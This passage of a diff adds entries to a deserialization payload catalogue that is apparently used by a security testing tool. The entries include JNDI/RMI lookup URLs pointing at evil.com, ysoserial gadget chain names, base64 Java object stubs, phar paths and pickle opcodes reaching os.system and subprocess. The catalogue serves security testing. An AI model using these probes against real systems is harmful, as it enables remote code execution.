+    "description": "Java RMI exploitation probe from OWASP. Tests application handling of: rmi://evil.com:1099/Object",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0086",
+    "name": "Java RMI exploitation #2",
+    "template": "rmi://127.0.0.1:1099/Exploit",
+    "description": "Java RMI exploitation probe from OWASP. Tests application handling of: rmi://127.0.0.1:1099/Exploit",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0087",
+    "name": "JNDI injection patterns",
+    "template": "ldap://evil.com/Exploit",
+    "description": "JNDI injection patterns probe from OWASP. Tests application handling of: ldap://evil.com/Exploit",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0088",
+    "name": "JNDI injection patterns #2",
+    "template": "ldaps://evil.com/Exploit",
+    "description": "JNDI injection patterns probe from OWASP. Tests application handling of: ldaps://evil.com/Exploit",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0089",
+    "name": "JNDI injection patterns #3",
+    "template": "rmi://evil.com/Exploit",
+    "description": "JNDI injection patterns probe from OWASP. Tests application handling of: rmi://evil.com/Exploit",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0090",
+    "name": "JNDI injection patterns #4",
+    "template": "dns://evil.com/Exploit",
+    "description": "JNDI injection patterns probe from OWASP. Tests application handling of: dns://evil.com/Exploit",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0091",
+    "name": "JNDI injection patterns #5",
+    "template": "iiop://evil.com/Exploit",
+    "description": "JNDI injection patterns probe from OWASP. Tests application handling of: iiop://evil.com/Exploit",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0092",
+    "name": "JNDI injection patterns #6",
+    "template": "corba://evil.com/Exploit",
+    "description": "JNDI injection patterns probe from OWASP. Tests application handling of: corba://evil.com/Exploit",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0093",
+    "name": "Java gadget chain references",
+    "template": "ysoserial.payloads.CommonsCollections1",
+    "description": "Java gadget chain references probe from OWASP. Tests application handling of: ysoserial.payloads.CommonsColl...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0094",
+    "name": "Java gadget chain references #2",
+    "template": "ysoserial.payloads.CommonsCollections2",
+    "description": "Java gadget chain references probe from OWASP. Tests application handling of: ysoserial.payloads.CommonsColl...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0095",
+    "name": "Java gadget chain references #3",
+    "template": "ysoserial.payloads.CommonsCollections3",
+    "description": "Java gadget chain references probe from OWASP. Tests application handling of: ysoserial.payloads.CommonsColl...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0096",
+    "name": "Java gadget chain references #4",
+    "template": "ysoserial.payloads.CommonsCollections4",
+    "description": "Java gadget chain references probe from OWASP. Tests application handling of: ysoserial.payloads.CommonsColl...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0097",
+    "name": "Java gadget chain references #5",
+    "template": "ysoserial.payloads.CommonsCollections5",
+    "description": "Java gadget chain references probe from OWASP. Tests application handling of: ysoserial.payloads.CommonsColl...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0098",
+    "name": "Java gadget chain references #6",
+    "template": "ysoserial.payloads.CommonsCollections6",
+    "description": "Java gadget chain references probe from OWASP. Tests application handling of: ysoserial.payloads.CommonsColl...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0099",
+    "name": "Java gadget chain references #7",
+    "template": "ysoserial.payloads.CommonsCollections7",
+    "description": "Java gadget chain references probe from OWASP. Tests application handling of: ysoserial.payloads.CommonsColl...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0100",
+    "name": "Java gadget chain references #8",
+    "template": "ysoserial.payloads.Groovy1",
+    "description": "Java gadget chain references probe from OWASP. Tests application handling of: ysoserial.payloads.Groovy1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0101",
+    "name": "Java gadget chain references #9",
+    "template": "ysoserial.payloads.Spring1",
+    "description": "Java gadget chain references probe from OWASP. Tests application handling of: ysoserial.payloads.Spring1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0102",
+    "name": "Java gadget chain references #10",
+    "template": "ysoserial.payloads.Spring2",
+    "description": "Java gadget chain references probe from OWASP. Tests application handling of: ysoserial.payloads.Spring2",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0103",
+    "name": "Java gadget chain references #11",
+    "template": "ysoserial.payloads.ROME",
+    "description": "Java gadget chain references probe from OWASP. Tests application handling of: ysoserial.payloads.ROME",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0104",
+    "name": "Java gadget chain references #12",
+    "template": "ysoserial.payloads.JDK7u21",
+    "description": "Java gadget chain references probe from OWASP. Tests application handling of: ysoserial.payloads.JDK7u21",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0105",
+    "name": "Java gadget chain references #13",
+    "template": "ysoserial.payloads.Jython1",
+    "description": "Java gadget chain references probe from OWASP. Tests application handling of: ysoserial.payloads.Jython1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0106",
+    "name": "Java gadget chain references #14",
+    "template": "ysoserial.payloads.Click1",
+    "description": "Java gadget chain references probe from OWASP. Tests application handling of: ysoserial.payloads.Click1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0107",
+    "name": "Java gadget chain references #15",
+    "template": "ysoserial.payloads.Wicket1",
+    "description": "Java gadget chain references probe from OWASP. Tests application handling of: ysoserial.payloads.Wicket1",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0108",
+    "name": "Base64 encoded Java serialized objects",
+    "template": "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
+    "description": "Base64 encoded Java serialized objects probe from OWASP. Tests application handling of: rO0ABXNyABdqYXZhLnV0aWwuUHJpb3...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0109",
+    "name": "Base64 encoded Java serialized objects #2",
+    "template": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAU=",
+    "description": "Base64 encoded Java serialized objects probe from OWASP. Tests application handling of: rO0ABXNyABFqYXZhLnV0aWwuSGFzaE...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0110",
+    "name": "Base64 encoded Java serialized objects #3",
+    "template": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldABA",
+    "description": "Base64 encoded Java serialized objects probe from OWASP. Tests application handling of: rO0ABXNyABFqYXZhLnV0aWwuSGFzaF...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0111",
+    "name": "PHP Phar deserialization",
+    "template": "phar://exploit.phar/test.txt",
+    "description": "PHP Phar deserialization probe from OWASP. Tests application handling of: phar://exploit.phar/test.txt",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0112",
+    "name": "PHP Phar deserialization #2",
+    "template": "phar://./exploit.phar",
+    "description": "PHP Phar deserialization probe from OWASP. Tests application handling of: phar://./exploit.phar",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0113",
+    "name": "PHP Phar deserialization #3",
+    "template": "phar://exploit.jpg/test.txt",
+    "description": "PHP Phar deserialization probe from OWASP. Tests application handling of: phar://exploit.jpg/test.txt",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0114",
+    "name": "AMF (Action Message Format)",
+    "template": "\\x00\\x03\\x00\\x00\\x00\\x01",
+    "description": "AMF (Action Message Format) probe from OWASP. Tests application handling of: \\x00\\x03\\x00\\x00\\x00\\x01",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0115",
+    "name": "MessagePack",
+    "template": "\\x81\\xa4eval\\xa6system",
+    "description": "MessagePack probe from OWASP. Tests application handling of: \\x81\\xa4eval\\xa6system",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0116",
+    "name": "Pickle bytecode patterns",
+    "template": "c__builtin__\\ngetattr\\n",
+    "description": "Pickle bytecode patterns probe from OWASP. Tests application handling of: c__builtin__\\ngetattr\\n",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0117",
+    "name": "Pickle bytecode patterns #2",
+    "template": "c__builtin__\\n__import__\\n",
+    "description": "Pickle bytecode patterns probe from OWASP. Tests application handling of: c__builtin__\\n__import__\\n",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0118",
+    "name": "Pickle bytecode patterns #3",
+    "template": "cos\\nsystem\\n",
+    "description": "Pickle bytecode patterns probe from OWASP. Tests application handling of: cos\\nsystem\\n",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0119",
+    "name": "Pickle bytecode patterns #4",
+    "template": "csubprocess\\ncall\\n",
+    "description": "Pickle bytecode patterns probe from OWASP. Tests application handling of: csubprocess\\ncall\\n",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0120",
+    "name": "Pickle bytecode patterns #5",
+    "template": "csubprocess\\ncheck_output\\n",
+    "description": "Pickle bytecode patterns probe from OWASP. Tests application handling of: csubprocess\\ncheck_output\\n",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0121",
+    "name": "Serialization headers detection",
+    "template": "\\xac\\xed\\x00\\x05  # Java serialization",
+    "description": "Serialization headers detection probe from OWASP. Tests application handling of: \\xac\\xed\\x00\\x05  # Java seria...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0122",
+    "name": "Serialization headers detection #2",
+    "template": "O:  # PHP serialization",
+    "description": "Serialization headers detection probe from OWASP. Tests application handling of: O:  # PHP serialization",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0123",
+    "name": "Serialization headers detection #3",
+    "template": "\\x80\\x03  # Python pickle protocol 3",
+    "description": "Serialization headers detection probe from OWASP. Tests application handling of: \\x80\\x03  # Python pickle prot...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0124",
+    "name": "Serialization headers detection #4",
+    "template": "\\x80\\x04  # Python pickle protocol 4",
+    "description": "Serialization headers detection probe from OWASP. Tests application handling of: \\x80\\x04  # Python pickle prot...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0125",
+    "name": "Serialization headers detection #5",
+    "template": "\\x04\\x08  # Ruby Marshal",
+    "description": "Serialization headers detection probe from OWASP. Tests application handling of: \\x04\\x08  # Ruby Marshal",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0126",
+    "name": "Serialization headers detection #6",
+    "template": "AAEAAAD  # .NET BinaryFormatter",
+    "description": "Serialization headers detection probe from OWASP. Tests application handling of: AAEAAAD  # .NET BinaryFormatte...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  },
+  {
+    "id": "deserialization-owasp-0127",
+    "name": "Serialization headers detection #7",
+    "template": "/wE  # .NET ObjectStateFormatter",
+    "description": "Serialization headers detection probe from OWASP. Tests application handling of: /wE  # .NET ObjectStateFormatt...",
+    "enabled": true,
+    "sourceType": "OWASP",
+    "sourceFile": "deserialization-payloads.txt"
+  }
+]
